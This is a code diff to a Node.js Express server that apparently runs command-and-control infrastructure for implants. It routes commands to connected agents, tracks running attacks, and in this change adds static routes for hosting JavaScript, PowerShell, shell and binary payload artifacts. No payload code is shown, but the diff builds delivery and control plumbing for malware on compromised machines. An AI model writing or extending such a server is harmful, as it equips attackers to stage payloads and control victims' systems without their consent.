@@ -8,9 +8,12 @@ import { WebSocketServer } from 'ws';
 import http from 'http'
 import cmd_router from './routes/cmd_routes.mjs';
 import implant_router from './routes/implant_routes.mjs';
+import artifacts_router from './routes/artifacts_routes.mjs';
 import Implant from './models/Implant_model.mjs';
 import cors from 'cors';
 import jwt from 'jsonwebtoken';
+import path from 'path';
+import { fileURLToPath } from 'url';
 
 
 
@@ -153,6 +156,9 @@ const webSocketsServer = async (httpServer, attacks_running) => {
 
 
 const main = async () =>{
+
+    const __filename = fileURLToPath(import.meta.url);
+    const __dirname = path.dirname(__filename);
     
     configDotenv();
     const app = express();
@@ -165,13 +171,19 @@ const main = async () =>{
     
     app.use(express.json())
     app.use(express.urlencoded({ extended: true })); // Para formularios HTML
-    app.use(express.static('public/arts/'));
+
+    app.use('/api/arts/js', express.static(path.join(__dirname, 'public/arts/js/') ));
+    app.use('/api/arts/power', express.static(path.join(__dirname, 'public/arts/power/') ));
+    app.use('/api/arts/sh', express.static(path.join(__dirname, 'public/arts/sh/') ));
+    app.use('/api/arts/bin', express.static(path.join(__dirname, 'public/arts/bin/') ));
+
     const server = http.createServer(app);
     const {agents} = await webSocketsServer(server, attacks_running)
     
     app.use('/api/auth', authRouter)
     app.use('/api/rcv', cmd_router(agents, attacks_running))
     app.use('/api/impl', implant_router())
+    app.use('/api/artifacts', artifacts_router())
     //------Type errors-----
     app.use(type_errors);
     app.use(syntax_errors);
